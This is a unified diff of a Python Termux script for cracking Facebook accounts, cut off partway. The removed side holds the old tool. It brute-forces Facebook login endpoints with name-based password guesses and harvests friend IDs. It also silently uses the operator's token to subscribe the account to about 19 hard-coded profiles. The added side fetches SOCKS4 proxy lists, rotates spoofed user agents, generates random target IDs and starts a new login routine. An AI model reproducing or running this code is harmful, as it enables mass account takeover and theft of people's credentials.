@@ -1,1912 +1,261 @@
+sys.stdout.write('\x1b]2; 𓆩🀪💚【STEVIIC】㊝𓆪 🔥 \x07')
 
+def request_storage_permission():
+    try:
+        open('/sdcard/@MdALAMGIR', 'w').write(' ')
+    except Exception as e:
+        print(e)
+        print('\x1b[1;93m Allow Termux Permissions! And Run Again ')
+        os.system('termux-setup-storage')
 
-
-import requests,bs4,sys,os,subprocess
-
-import requests,sys,random,time,re,base64,json
-
-reload(sys)
-
-sys.setdefaultencoding("utf-8")
-
-from multiprocessing.pool import ThreadPool
-
-
-
-#### STEVIIC-TRICKER####
-
-# P = '\033[0;97m'  # putih
-
-# M = '\033[0;91m' # merah
-
-# H = '\033[0;92m' # hijau
-
-# K = '\033[0;93m' # kuning
-
-# B = '\033[0;94m' # biru
-
-# U = '\033[0;95m' # ungu
-
-# O = '\033[0;96m' # biru muda
-
-
-
-if ("linux" in sys.platform.lower()):
-
-
-
-        N = '\033[0m'
-
-        G = '\033[1;92m'
-
-        O = '\033[1;97m'
-
-        R = '\033[1;91m'
-
-else:
-
-
-
-        N = ''
-
-        G = ''
-
-        O = ''
-
-        R = ''
-
-def banner():
-
-	print("""
-
-\033[0;96m    _________ __     
-
-\033[0;96m   / ____/ (_) /____  \033[0;96m║ \033[0;97mCoded By \033[0;96mRIAZKHAN \033[0;97m& \033[0;96mALI
-
-\033[0;96m  / __/ / / / __/ _ \ \033[0;96m║ \033[0;97mFB \033[0;96m: \033[0;97mFacebook.com/RIAZKHANXD
-
-\033[0;96m / /___/ / / /_/  __/ \033[0;96m║ \033[0;97mFB \033[0;96m: \033[0;97mFacebook.com/ALIXD
-
-\033[0;96m/_____/_/_/\__/\___/  \033[0;96m║ \033[0;97mGithub \033[0;96m: \033[0;97mGithub.com/RED-MAFIA/SH
-
-\033[0;96m─────────────────────────────────────────────────────────────""")
-
-
-
-host="https://mbasic.facebook.com"
-
-ua="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
-
-ips=None
+directories = ['/sdcard/ALAMGIR', '/sdcard/Md-ALAMGIR', '/sdcard/ALAMGIR/Md-ALAMGIR']
+for folder_path in directories:
+    try:
+        os.makedirs(folder_path, exist_ok=True)
+    except Exception as e:
+        print(f'An error occurred while creating {folder_path}: {e}')
 
 try:
-
-	b=requests.get("https://api.ipify.org").text.strip()
-
-	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"].lower()
-
-except:
-
-	ips=None
-
-uas=None
-
-if os.path.exists(".browser"):
-
-	if os.path.getsize(".browser") !=0:
-
-		uas=open(".browser").read().strip()
-
-touch_fbh={"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-
-
-
-m_fbh={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-
-
-
-mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-
-
-
-graph_h={"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-
-def clear():
-
-	if " linux" in sys.platform.lower():
-
-		os.system("clear")
-
-	elif "win" in sys.platform.lower():
-
-		os.system("cls")
-
-	else:os.system("clear")
-
-def lang(cookies):
-
-	f=False
-
-	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
-
-	for i in rr.find_all("a",href=True):
-
-		if "id_ID" in i.get("href"):
-
-			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
-
-			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
-
-			if "apa yang anda pikirkan sekarang" in b.lower():
-
-				f=True
-
-	if f==True:
-
-		return True
-
-	else:
-
-		exit("   [!]Cookies Mati").format(R,N)
-
-def basecookie():
-
-	if os.path.exists(".cok"):
-
-		if os.path.getsize(".cok") !=0:
-
-			return gets_dict_cookies(open('.cok').read().strip())
-
-		else:logs()
-
-	else:logs()
-
-def hdcok():
-
-	global host,ua
-
-	hosts=host
-
-	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
-
-	return r
-
-def gets_cookies(cookies):
-
-	result=[]
-
-	for i in enumerate(cookies.keys()):
-
-		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
-
-		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
-
-	return "".join(result)
-
-def gets_dict_cookies(cookies):
-
-	result={}
-
-	try:
-
-		for i in cookies.split(";"):
-
-			result.update({i.split("=")[0]:i.split("=")[1]})
-
-		return result
-
-	except:
-
-		for i in cookies.split("; "):
-
-			result.update({i.split("=")[0]:i.split("=")[1]})
-
-		return result
-
-def gen():
-
-	ck=raw_input("   [•] Cookie : ")
-
-	if ck=="":gen()
-
-	try:
-
-		cks=gets_dict_cookies(ck)
-
-		if lang(cks)==True:
-
-			open(".cok","w").write(ck)
-
-			convert()
-
-			print ('   [!] Login Success').format(G,N)
-
-			time.sleep(1)
-
-			menu()
-
-		else:print("   [!] Invalid Cookie").format(R,N);gen()
-
-	except Exception as e:
-
-		print("   [!] Error : %s"%e);gen()
-
-                logs()
-
-def log_token():
-
-	data = raw_input("   [•] Token :")
-
-	try:
-
-		me = requests.get('https://graph.facebook.com/me?access_token='+data)
-
-		a = json.loads(me.text)
-
-		nama = a['name']
-
-		open("login.txt",'w').write(data)
-
-		print("   [!] Login Success").format(G,N)
-
-		bot_komen()
-
-		menu()
-
-	except KeyError:
-
-		print ("   [!] Invalid Token").format(R,N)
-
-		time.sleep(1.0)
-
-		logs()
-
-def convert():
-
-	global post,reac,kom
-
-	try:
-
-		tomken = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
-
-		'user-agent'                : 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36', #Jangan Diganti Anjink
-
-		'referer'                   : 'https://m.facebook.com/',
-
-		'host'                      : 'm.facebook.com',
-
-		'origin'                    : 'https://m.facebook.com',
-
-		'upgrade-insecure-requests' : '1',
-
-		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-
-		'cache-control'             : 'max-age=0',
-
-		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-
-		'content-type'              : 'text/html; charset=utf-8'
-
-		}, cookies = {
-
-		'cookie'                    : open(".cok",'r').read()
-
-		})
-
-		find_token = re.search('(EAAA\w+)', tomken.text)
-
-		if (find_token is None):
-
-			pass
-
-		else:
-
-			open("login.txt",'w').write(find_token.group(1))
-
-			return
-
-	except Exception as e:
-
-		print(R+"\n   [•] Error : %s"%e)
-
-		exit()
-
-def bot_komen():
-
-	try:
-
-		toket=open('login.txt','r').read()
-
-	except IOError:
-
-		print"   [!] Token invalid"
-
-		logs()
-
-	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)
-
-	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)
-
-	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket)
-
-	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)
-
-	requests.post('https://graph.facebook.com/1409058/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/100053093889653/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/100037914692898/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/100057755937035/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket)
-
-        requests.post('https://graph.facebook.com/100002565109395/subscribers?access_token=' + toket)
-
-	menu()
-
-def menu():
-
-  try:
-
-    toket = open('login.txt','r').read()
-
-    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
-
-    a = json.loads(otw.text)
-
-    nama = a['name']
-
-    id = a['id']
-
-  except Exception as e:
-
-    print ("   [•] Error : %s"%e).format(R,N)
-
-    time.sleep(1)
-
-    logs()
-
-  os.system("clear")
-
-  banner()
-
-  print("\033[0;96m╔══\033[0;97m[•] Hello : "+nama)
-
-  print("\033[0;96m╚══\033[0;97m[•] UID : "+id)
-
-  print("\033[0;96m─────────────────────────────────────────────────────────────")
-
-  print("\033[0;96m╔══\033[0;97m[ Pilih Opsi ]")
-
-  print("\033[0;96m║")
-
-  print("\033[0;96m╠══\033[0;97m[1] Dump ID Public/Friend")
-
-  print("\033[0;96m╠══\033[0;97m[2] Crack")
-
-  print("\033[0;96m╚══\033[0;97m[0] Logout")
-
-  print("\033[0;96m─────────────────────────────────────────────────────────────")
-
-  r=raw_input("\033[0;97m   [•] Input : ")
-
-  if r=="":print("\033[0;97m   [!] Isi Yang Benar").format(R,N);menu()
-
-  elif r=="1":
-
-    publik()
-
-  elif r=="2":
-
-    methode()
-
-    exit()
-
-  elif r=="0":
-
+    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+    open('/sdcard/.proxy.txt', 'w').write(prox)
+except Exception as e:
+    print('')
+    prox = open('/sdcard/.proxy.txt', 'r').read().splitlines()
+
+successfull = []
+G = '\x1b[1;92m'
+W = '\x1b[0;97m'
+Y = '\x1b[1;93m'
+B = '\x1b[1;90m'
+x = f'{G}➤{W}➤'
+xy1 = f'{G}•{W}•'
+xy = f'{G}━{W}➤'
+ALAMGIR = f'{B}[{G}━{W}]'
+op1 = f'{W}|{G}1{W}|'
+op2 = f'{W}|{G}2{W}|'
+op0 = f'{W}|{G}0{W}|'
+ch = f'{W}|{G}?{W}|'
+
+def line():
+    print(f"{W}───────────────────────────────────────────────")
+
+_month_ = {
+    '1': 'January', '2': 'February', '3': 'March', '4': 'April',
+    '5': 'May', '6': 'June', '7': 'July', '8': 'August',
+    '9': 'September', '10': 'October', '11': 'November', '12': 'December'
+}
+date = datetime.now().day
+month = _month_[str(datetime.now().month)]
+year = datetime.now().year
+date_and_year = f"{str(date)}\x1b[1;90m-\x1b[1;92m{str(month)}\x1b[1;90m-\x1b[1;92m{str(year)}"
+
+def Banner():
+    if 'Linux' in sys.platform.capitalize():
+        os.system('clear')
+    else:
+        os.system('cls')
+    return '\n   \x1b[38;5;196m ██████ \x1b[33;1m██    ██ \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██████  \n   \x1b[38;5;196m██       \x1b[33;1m██  ██  \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ \n   \x1b[38;5;196m██        \x1b[33;1m████   \x1b[38;5;46m██████  \x1b[34;1m█████   \x1b[38;5;196m██████  \n   \x1b[38;5;196m██         \x1b[33;1m██    \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ \n   \x1b[38;5;196m ██████    \x1b[33;1m██    \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██   ██ \n   \x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mDEVELOPER \x1b[1;91m :   \x1b[1;92mCYBER-SAMEER\n   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mFACEBOOK \x1b[1;91m  :   \x1b[1;92mSAMEER\n   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL TYPE \x1b[1;91m :   \x1b[1;92mFREE\n   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mVERSION \x1b[1;91m   :   \x1b[1;92m12.8\n   \x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'        
+
+attemps = 0
+while attemps < 12345677901:
+    username = input(' \x1b[0;92mEnter Username: ')
+    password = input(' \x1b[0;93mEnter Password: ')
+    if username == 'ST3VIIC' and password == 'KING':
+        print(' \x1b[0;92mYou Have Successfully Logged in.')
+        break
+    else:
+        print(' Incorrect Pass Please Trying ')
+        attemps += 1
+os.system('clear')
+
+def creationyear(uid):
+    if len(uid) == 15:
+        if uid[:10] in ('1000000000',): Md_dgk = '2009'
+        elif uid[:9] in ('100000000',): Md_dgk = '2009'
+        elif uid[:8] in ('10000000',): Md_dgk = '2009'
+        elif uid[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'): Md_dgk = '2009'
+        elif uid[:7] in ('1000006', '1000007', '1000008', '1000009'): Md_dgk = '2010'
+        elif uid[:6] in ('100001',): Md_dgk = '2010'
+        elif uid[:6] in ('100002', '100003'): Md_dgk = '2011'
+        elif uid[:6] in ('100004',): Md_dgk = '2012'
+        elif uid[:6] in ('100005', '100006'): Md_dgk = '2013'
+        elif uid[:6] in ('100007', '100008'): Md_dgk = '2014'
+        elif uid[:6] in ('100009',): Md_dgk = '2015'
+        elif uid[:5] in ('10001',): Md_dgk = '2016'
+        elif uid[:5] in ('10002',): Md_dgk = '2017'
+        elif uid[:5] in ('10003',): Md_dgk = '2018'
+        elif uid[:5] in ('10004',): Md_dgk = '2019'
+        elif uid[:5] in ('10005',): Md_dgk = '2020'
+        elif uid[:5] in ('10006',): Md_dgk = '2021'
+        elif uid[:5] in ('10009',): Md_dgk = '2023'
+        elif uid[:5] in ('10007', '10008'): Md_dgk = '2022'
+        else: Md_dgk = ''
+    elif len(uid) in (9, 10): Md_dgk = '2008'
+    elif len(uid) == 8: Md_dgk = '2007'
+    elif len(uid) == 7: Md_dgk = '2006'
+    elif len(uid) == 14 and uid[:2] in ('61',): Md_dgk = '2024'
+    else: Md_dgk = ''
+    return Md_dgk
+
+import random
+
+# Latest Chrome Windows
+def ua_windows():
+    rr = random.randint
+    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rr(120, 127)}.0.{rr(6000, 7200)}.{rr(40, 150)} Safari/537.36"
+
+# Latest Chrome Android
+def ua_android():
+    rr = random.randint
+    android_version = random.choice(["12", "13", "14", "15"])  # latest android
+    device = random.choice([
+        "SM-S918B", "SM-S928U", "Pixel 8 Pro", "Pixel 7", "Infinix X6831",
+        "Redmi Note 13 Pro", "OnePlus 11", "Vivo V29", "Realme GT Neo"
+    ])
+    return f"Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rr(120, 127)}.0.{rr(6000, 7200)}.{rr(40, 150)} Mobile Safari/537.36"
+
+# Latest iPhone Safari
+def ua_ios():
+    ios_version = random.choice(["16_6", "17_0", "17_3", "17_5"])
+    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+
+# Random choice between latest UAs
+def useragent():
+    return random.choice([ua_windows(), ua_android(), ua_ios()])
+
+def generate_user_ids(limit=None):
+    if limit:
+        return [str(random.randint(111111111, 999999999)) for _ in range(limit)]
+    return [str(random.randint(111111111, 999999999)) for _ in range(1000)]
+
+import random
+
+# 🔹 Windows Chrome UA
+def ua_windows():
+    rr = random.randint
+    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rr(120,127)}.0.{rr(6000,7200)}.{rr(40,150)} Safari/537.36"
+
+# 🔹 Android Chrome UA
+def ua_android():
+    rr = random.randint
+    android_version = random.choice(["12", "13", "14", "15"])
+    device = random.choice([
+        "SM-S928B", "SM-S918U", "Pixel 8 Pro", "Pixel 9", "Infinix X6831",
+        "Redmi Note 13 Pro", "OnePlus 12", "Vivo V40", "Realme GT 6"
+    ])
+    return f"Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rr(120,127)}.0.{rr(6000,7200)}.{rr(40,150)} Mobile Safari/537.36"
+
+# 🔹 iPhone Safari UA
+def ua_ios():
+    ios_version = random.choice(["16_6", "17_3", "17_5"])
+    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+
+# 🔹 Facebook Android App (Katana)
+def fb_android():
+    device = random.choice(["SM-S928B", "Pixel 8 Pro", "RMX3770", "Infinix X6831"])
+    return f"[FBAN/FB4A;FBAV/{random.randint(450, 650)}.0.0.{random.randint(10, 99)};FBBV/{random.randint(300000000, 399999999)};FBDM/{{density=3.0,width=1080,height=2400}};FBLC/en_US;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{device};FBSV/{random.choice(['13','14','15'])};FBOP/1;FBCA/arm64-v8a:;]"
+
+# 🔹 Facebook Messenger (Orca)
+def fb_messenger():
+    device = random.choice(["SM-S918U", "Pixel 9", "RMX3939"])
+    return f"Dalvik/2.1.0 (Linux; U; Android {random.choice(['13','14','15'])}; {device} Build/QP1A.{random.randint(111111,999999)}.011) [FBAN/Orca-Android;FBAV/{random.randint(350, 500)}.0.0.{random.randint(10, 99)};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{random.randint(300000000, 399999999)};FBCR/AirTel;FBMF/samsung;FBBD/samsung;FBDV/{device};FBSV/{random.choice(['13','14','15'])};FBCA/arm64-v8a:;FBDM/{{density=3.0,width=1080,height=2400}};FB_FW/1;]"
+
+# 🔹 Random UA selector
+def random_ua():
+    return random.choice([
+        ua_windows(),
+        ua_android(),
+        ua_ios(),
+        fb_android(),
+        fb_messenger()
+    ])
+
+def login(uid):
     try:
-
-      os.remove(".cok")
-
-      os.remove("login.txt")
-
-      exit(basecookie())
-
-    except Exception as e:print("\033[0;97m   [•] Error file tidak ditemukan %s"%e)
-
-  else:
-
-    print ("   [•] Wrong Input").format(R,N);menu()
-
-def publik():
-
-	try:
-
-		toket=open('login.txt','r').read()
-
-	except IOError:
-
-		print("   [•] Cookie Invalid").format(R,N)
-
-		os.system('rm -rf login.txt')
-
-		time.sleep(0.01)
-
-		gen()
-
-	try:
-
-                os.system("clear")
-
-                banner()
-
-                print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-		print("\033[0;96m╔══\033[0;97m[•] Ketik \'me\' Jika Ingin Mengambil ID Dari Daftar Teman")
-
-		idt = raw_input("\033[0;96m╠══\033[0;97m[•] User ID Target : ")
-
-		try:
-
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-
-			op = json.loads(jok.text)
-
-			print("\033[0;96m╠══\033[0;97m[•] Name           : "+op["name"])
-
-		except KeyError:
-
-			print("   [!] ID NOT found !").format("R")
-
-			print("   [!] Kembali").format(N)
-
-			publik()
-
-		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
-
-		id = []
-
-		z=json.loads(r.text)
-
-		print("\033[0;96m╚══\033[0;97m[•] Getting ID ...")
-
-		print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-		qq = (op['first_name']+'.json').replace(" ","_")
-
-		ys = open(qq , 'w')#.replace(" ","_")
-
-		for a in z['friends']['data']:
-
-			id.append(a['id']+"<=>"+a['name'])
-
-			ys.write(a['id']+"<=>"+a['name']+'\n')
-
-			print("\r  %s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
-
-			print (  a["name"])
-
-		ys.close()
-
-		print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-		print ('\033[0;96m╔══\033[0;97m[•] Sukses Mengambil ID dari %s'%op['name'])
-
-		print ("\033[0;96m╠══\033[0;97m[•] Total ID : %s"%(len(id)))
-
-		print ("\033[0;96m╚══\033[0;97m[•] Output : %s"%qq)
-
-                print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-		raw_input("\033[0;97m   [•] [Kembali]")
-
-		menu()
-
-		
-
-	except Exception as e:
-
-		exit("   [•] Error : %s"%e)
-
-def mbasic(em,pas,hosts):
-
-	global ua,mbasic_h
-
-	r=requests.Session()
-
-	r.headers.update(mbasic_h)
-
-	p=r.get("https://mbasic.facebook.com/")
-
-	b=bs4.BeautifulSoup(p.text,"html.parser")
-
-	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
-
-	data={}
-
-	for i in b("input"):
-
-		if i.get("value") is None:
-
-			if i.get("name")=="email":
-
-				data.update({"email":em})
-
-			elif i.get("name")=="pass":
-
-				data.update({"pass":pas})
-
-			else:
-
-				data.update({i.get("name"):""})
-
-		else:
-
-			data.update({i.get("name"):i.get("value")})
-
-	data.update(
-
-		{"fb_dtsg":meta,"m_sess":"","__user":"0",
-
-		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
-
-		}
-
-	)
-
-	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
-
-	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
-
-	if "c_user" in r.cookies.get_dict().keys():
-
-		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
-
-	elif "checkpoint" in r.cookies.get_dict().keys():
-
-		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
-
-	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
-
-def m_fb(em,pas,hosts):
-
-	global ua,m_fbh
-
-	r=requests.Session()
-
-	r.headers.update(m_fbh)
-
-	p=r.get("https://m.facebook.com/")
-
-	b=bs4.BeautifulSoup(p.text,"html.parser")
-
-	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
-
-	data={}
-
-	for i in b("input"):
-
-		if i.get("value") is None:
-
-			if i.get("name")=="email":
-
-				data.update({"email":em})
-
-			elif i.get("name")=="pass":
-
-				data.update({"pass":pas})
-
-			else:
-
-				data.update({i.get("name"):""})
-
-		else:
-
-			data.update({i.get("name"):i.get("value")})
-
-	data.update(
-
-		{"fb_dtsg":meta,"m_sess":"","__user":"0",
-
-		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
-
-		}
-
-	)
-
-	r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
-
-	po=r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
-
-	if "c_user" in r.cookies.get_dict().keys():
-
-		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
-
-	elif "checkpoint" in r.cookies.get_dict().keys():
-
-		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
-
-	else:return {"status":"error","email":em,"pass":pas}#crack m.fb
-
-def touch_fb(em,pas,hosts):
-
-	global ua,touch_fbh
-
-	r=requests.Session()
-
-	r.headers.update(touch_fbh)
-
-	p=r.get("https://touch.facebook.com/")
-
-	b=bs4.BeautifulSoup(p.text,"html.parser")
-
-	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
-
-	data={}
-
-	for i in b("input"):
-
-		if i.get("value") is None:
-
-			if i.get("name")=="email":
-
-				data.update({"email":em})
-
-			elif i.get("name")=="pass":
-
-				data.update({"pass":pas})
-
-			else:
-
-				data.update({i.get("name"):""})
-
-		else:
-
-			data.update({i.get("name"):i.get("value")})
-
-	data.update(
-
-		{"fb_dtsg":meta,"m_sess":"","__user":"0",
-
-		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
-
-		}
-
-	)
-
-	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
-
-	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
-
-	if "c_user" in r.cookies.get_dict().keys():
-
-		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
-
-	elif "checkpoint" in r.cookies.get_dict().keys():
-
-		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
-
-	else:return {"status":"error","email":em,"pass":pas}#touch fb
-
-def graph_fb(em,pas,hosts):
-
-	global ua,mbasic_h
-
-	r=requests.Session()
-
-	r.headers.update(mbasic_h)
-
-	p=r.get("https://mbasic.facebook.com/")
-
-	b=bs4.BeautifulSoup(p.text,"html.parser")
-
-	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
-
-	data={}
-
-	for i in b("input"):
-
-		if i.get("value") is None:
-
-			if i.get("name")=="email":
-
-				data.update({"email":em})
-
-			elif i.get("name")=="pass":
-
-				data.update({"pass":pas})
-
-			else:
-
-				data.update({i.get("name"):""})
-
-		else:
-
-			data.update({i.get("name"):i.get("value")})
-
-	data.update(
-
-		{"fb_dtsg":meta,"m_sess":"","__user":"0",
-
-		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
-
-		}
-
-	)
-
-	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
-
-	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
-
-	if "c_user" in r.cookies.get_dict().keys():
-
-		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
-
-	elif "checkpoint" in r.cookies.get_dict().keys():
-
-		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
-
-	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
-
-def generate(text):
-
-	results=[]
-
-	global ips
-
-	for i in text.split(" "):
-
-		if len(i)<3:
-
-			continue
-
-		else:
-
-			i=i.lower()
-
-			if len(i)==3 or len(i)==4 or len(i)==5:
-
-				results.append(i+"123")
-
-				results.append(i+"12345")
-
-			else:
-
-				results.append(i+"123")
-
-				results.append(i+"1234")
-
-				results.append(i+"12345")
-
-				results.append(i+"007")
-
-				if "pakistan" in ips:
-
-					results.append("freefireking")
-
-					results.append("freefire")
-
-					results.append("445566")
-
-                                        results.append("freefirelover")
-
-	return results
-
-def methode():
-
-  os.system("clear")
-
-  banner()
-
-  print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-  print("\033[0;96m╔══\033[0;97m[ Pilih Metode Crack ]")
-
-  print("\033[0;96m║")
-
-  print("\033[0;96m╠══\033[0;97m[1] Crack With mbasic")
-
-  print("\033[0;96m╠══\033[0;97m[2] Crack With m.facebook.com")
-
-  print("\033[0;96m╠══\033[0;97m[3] Crack With touch.facebook.com")
-
-  print("\033[0;96m╚══\033[0;97m[4] Crack With api")
-
-  print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-  sek=raw_input("\033[0;96m╔══\033[0;97m[•] Input : ")
-
-  if sek=="":print("\033[0;97m   [!] Isi Yang Benar").format(R,N);methode()
-
-  elif sek=="1":
-
-    crack()
-
-  elif sek=="2":
-
-    crack1()
-
-  elif sek=="3":
-
-    crack2()
-
-  elif sek=="4":
-
-    crack3()
-
-  else:
-
